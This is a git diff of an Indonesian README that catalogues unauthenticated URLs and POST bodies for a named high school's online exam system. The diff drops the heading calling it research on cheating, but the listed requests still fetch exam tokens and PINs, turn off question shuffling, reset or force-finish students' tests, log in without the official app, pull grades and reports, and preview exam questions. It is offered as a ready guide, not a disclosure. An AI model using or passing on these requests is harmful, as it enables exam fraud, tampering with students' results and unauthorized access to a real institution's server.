@@ -1,3 +1,37 @@
+<p align="center">
+<img src="https://avatars2.githubusercontent.com/u/53950128?s=460&u=09f530e3326f710c4e0f9106f094eeea5429f86d&v=4" width="128" height="128"/>
+</p>
+<p align="center">
+<a href="#"><img title="Whatsapp-Bot" src="https://img.shields.io/badge/Whatsapp Bot-green?colorA=%23ff0000&colorB=%23017e40&style=for-the-badge"></a>
+</p>
+<p align="center">
+<a href="https://github.com/ArugaZ"><img title="Author" src="https://img.shields.io/badge/AUTHOR-ARUGAZ-orange.svg?style=for-the-badge&logo=github"></a>
+</p>
+<p align="center">
+<a href="https://www.codefactor.io/repository/github/arugaz/whatsapp-bot/overview/master"><img title="Rating" src="https://www.codefactor.io/repository/github/arugaz/whatsapp-bot/badge/master"></a>
+</p>
+<p align="center">
+<a href="https://github.com/arugaz/followers"><img title="Followers" src="https://img.shields.io/github/followers/arugaz?color=blue&style=flat-square"></a>
+<a href="https://github.com/arugaz/whatsapp-bot/stargazers/"><img title="Stars" src="https://img.shields.io/github/stars/arugaz/whatsapp-bot?color=red&style=flat-square"></a>
+<a href="https://github.com/arugaz/whatsapp-bot/network/members"><img title="Forks" src="https://img.shields.io/github/forks/arugaz/whatsapp-bot?color=red&style=flat-square"></a>
+<a href="https://github.com/arugaz/whatsapp-bot/watchers"><img title="Watching" src="https://img.shields.io/github/watchers/arugaz/whatsapp-bot?label=Watchers&color=blue&style=flat-square"></a>
+<a href="https://hits.seeyoufarm.com"><img src="https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2FArugaZ%2Fwhatsapp-bot&count_bg=%2379C83D&title_bg=%23555555&icon=probot.svg&icon_color=%2300FF6D&title=hits&edge_flat=false"/></a>
+</p>
+<div align="center">
+<details>
+ <summary>🥟 Help me!</summary>
+ 
+ [Trakteer](https://trakteer.id/nizariyf)
+ 
+</details>
+
+ini semua gratis, jangan pelit ⭐️ ya :D
+<p align="center"><a href="https://nidev.me/fesco" target="_blank">Fesco Web</a>.</p>
+<p align="center"><a href="https://instagram.com/nizariyf_/" target="_blank">Chat me on Insta</a>.</p>
+</div>
+
+---
+
 ![https://nidev.me](https://nidev.me/fesco/assets/images/logo.png)
 ## Riset ABT SMANKA
 ```Riset ABT SMANKA V 4.1 pada tahun 2020```
@@ -5,39 +39,38 @@
 ## Website Fesco Khusus Tes
 [Nidev Fesco](https://nidev.me/fesco/secret)
 
-### Riset Curang Atau Inject Tes
 
-##### Nonaktifkan & Aktifkan Mapel Tes
+### Nonaktifkan & Aktifkan Mapel Tes
    - Nonaktifkan Mapel\
    `sman1kaliwungu.sch.id/smanka/aktif.php?mapel=geo12vero&stat=0`
 
    - Aktifkan Mapel\
    `sman1kaliwungu.sch.id/smanka/aktif.php?mapel=geo12vero&stat=1`
 
-##### Nonaktifkan & Aktifkan Acak Soal
+### Nonaktifkan & Aktifkan Acak Soal
    - Nonaktifkan Acak\
    `sman1kaliwungu.sch.id/smanka/acak2.php?stat=0`
 
    - Aktifkan Acak\
    `sman1kaliwungu.sch.id/smanka/acak2.php?stat=1`
 
-##### Ulangi Kerjakan Test Melanjutkan waktu
+### Ulangi Kerjakan Test Melanjutkan waktu
    `sman1kaliwungu.sch.id/smanka/ulangi.php?ujian=(noujian/nisn)&mapel=geo12vero`
    
-##### Ulangi Kerjakan Test dari nol
+### Ulangi Kerjakan Test dari nol
    `sman1kaliwungu.sch.id/smanka/ulanginol.php?ujian=(noujian/nisn)&mapel=geo12vero`
 
-##### Ambil Token Ujian
+### Ambil Token Ujian
    `sman1kaliwungu.sch.id/smanka/ambiltoken.php`
 
-##### Ambil Pin Ujian
+### Ambil Pin Ujian
    `sman1kaliwungu.sch.id/smanka/pin.php`
 
-##### Ambil Analisis
+### Ambil Analisis
    `sman1kaliwungu.sch.id/smanka/analisis.php?kirim=0geo12vero`\
    `sman1kaliwungu.sch.id/smanka/ulanganexcel.php?kirim=0geo12verov`
 
-##### Login Ujian Tanpa APK
+### Login Ujian Tanpa APK
    `sman1kaliwungu.sch.id/smanka/and.php`
 
    Metode inject harus menggunakan pihak kedua yaitu web local atau bisa web online
@@ -54,71 +87,71 @@
       >
       > masuk=(noujian/nisn)&mlebu=(password)
 
-##### Nonaktifkan & Aktifkan Client
+### Nonaktifkan & Aktifkan Client
    - Nonaktifkan Client\
    `sman1kaliwungu.sch.id/smanka/aktif.php?stat=0`
 
    - Aktifkan Client\
    `sman1kaliwungu.sch.id/smanka/aktif.php?stat=1`
    
-##### Nonaktifkan & Aktifkan Nilai diClient
+### Nonaktifkan & Aktifkan Nilai diClient
    - Nonaktifkan Nilai Client\
    `sman1kaliwungu.sch.id/smanka/client.php?stat=0`
 
    - Aktifkan Nilai Client\
    `sman1kaliwungu.sch.id/smanka/client.php?stat=1`
    
-##### Nonaktifkan & Aktifkan Reset Siswa
+### Nonaktifkan & Aktifkan Reset Siswa
    - Nonaktifkan Reset Siswa\
    `sman1kaliwungu.sch.id/smanka/matil.php?stat=0`
 
    - Aktifkan Reset Siswa\
    `sman1kaliwungu.sch.id/smanka/matil.php?stat=1`
    
-##### Nonaktifkan & Aktifkan Token
+### Nonaktifkan & Aktifkan Token
    - Nonaktifkan Token\
    `sman1kaliwungu.sch.id/smanka/mati.php?stat=0`
 
    - Aktifkan Reset Token\
    `sman1kaliwungu.sch.id/smanka/mati.php?stat=1`
 
-##### Cetak Nilai
+### Cetak Nilai
    `sman1kaliwungu.sch.id/smanka/cetak.php`\
    `sman1kaliwungu.sch.id/smanka/ulanganexcel.php?kirim=0geo12vero`
    `sman1kaliwungu.sch.id/smanka/pdf/ujian7.php?mapel=geo12vero`
    `sman1kaliwungu.sch.id/smanka/pdf/ujian.php?mapel=geo12vero`
 
-##### Cek Laporan nilai
+### Cek Laporan nilai
    `sman1kaliwungu.sch.id/smanka/laporan.php`
    > Post Body
    >
    > kirim=0geo12vero
 
-##### Cek Siswa belum tes
+### Cek Siswa belum tes
    `sman1kaliwungu.sch.id/smanka/belumtest.php`
    > Post Body
    >
    > kirim=geo12vero
 
-##### Paksa Selesai
-   1. Paksa Semua
+### Paksa Selesai
+   - Paksa Semua
       `sman1kaliwungu.sch.id/smanka/paksasemuanya.php?kirim`
-   2. Paksa Beberapa siswa
+   - Paksa Beberapa siswa
       `sman1kaliwungu.sch.id/smanka/paksaselesai.php?user=(no ujian/nisn)&id=geo12vero`
 
-##### Cek Raport
-   1. Metode Inject Post\
+### Cek Raport
+   - Metode Inject Post\
       `sman1kaliwungu.sch.id/smanka/raport.php`
       > Post Body
       >
       > kirim=0geo12vero
-   2. Metode Inject Post\
+   - Metode Inject Post\
       `sman1kaliwungu.sch.id/smanka/reportnya.php`
       > Post Body
       >
       >  kirim=0geo12vero
 
-##### Reset Peserta
+### Reset Peserta
    `sman1kaliwungu.sch.id/smanka/reset.php`\
    `sman1kaliwungu.sch.id/smanka/reset1.php?user=(noujian/nisn)&id=geo12vero`\
    `sman1kaliwungu.sch.id/smanka/reset2.php?user=(noujian/nisn)&id=geo12vero`\
@@ -126,7 +159,7 @@
 
 
 
-> #### Keterangan
+> ### Keterangan
 >
 > - ``geo12vero = ID Mapel``
 > - ``0geo12vero = Tipe Soal + ID Mapel = 0 + geo12vero``
@@ -180,3 +213,5 @@ Geografi          = 0 + geo12vero
 
 **Soal Ekonomi**\
 `sman1kaliwungu.sch.id/smanka/previewsoal.php?kirim=eko12pas1riskah&nomer=1&jml=50&sp=&batas=50`
+
+---
